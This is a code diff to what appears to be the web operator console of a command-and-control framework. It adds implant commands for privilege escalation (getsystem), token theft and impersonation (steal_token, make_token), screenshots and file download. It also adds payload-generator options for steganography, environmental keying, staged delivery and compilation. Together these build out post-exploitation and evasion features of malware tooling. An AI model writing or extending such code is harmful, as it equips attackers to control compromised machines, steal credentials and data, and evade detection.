@@ -716,7 +716,21 @@
             openBofModal(agentId);
             return;
         }
-        if (command.indexOf('desktop ') === 0) {
+        var postexAliases = {
+            'screenshot': '__px:screenshot',
+            'getsystem': '__px:token:getsystem',
+            'rev2self': '__px:token:rev2self',
+        };
+        var cmdLower = command.toLowerCase().trim();
+        if (postexAliases[cmdLower]) {
+            command = postexAliases[cmdLower];
+        } else if (cmdLower.indexOf('steal_token ') === 0) {
+            command = '__px:token:steal_token ' + command.slice(12);
+        } else if (cmdLower.indexOf('make_token ') === 0) {
+            command = '__px:token:make_token ' + command.slice(11);
+        } else if (cmdLower.indexOf('download ') === 0) {
+            command = '__px:download:' + command.slice(9);
+        } else if (command.indexOf('desktop ') === 0) {
             command = '__hd:' + command.slice(8);
         } else if (command === 'desktop') {
             command = '__hd:frame';
@@ -830,6 +844,10 @@
             lang: form.get('lang') || 'go',
             output_format: form.get('output_format') || 'exe',
             shellcode_format: form.get('shellcode_format') || 'raw',
+            stego: !!form.get('stego'),
+            env_keying: form.get('env_keying') || null,
+            staged: !!form.get('staged'),
+            compile: !!form.get('compile'),
         };
         try {
             var result = await api('POST', '/generate', body);
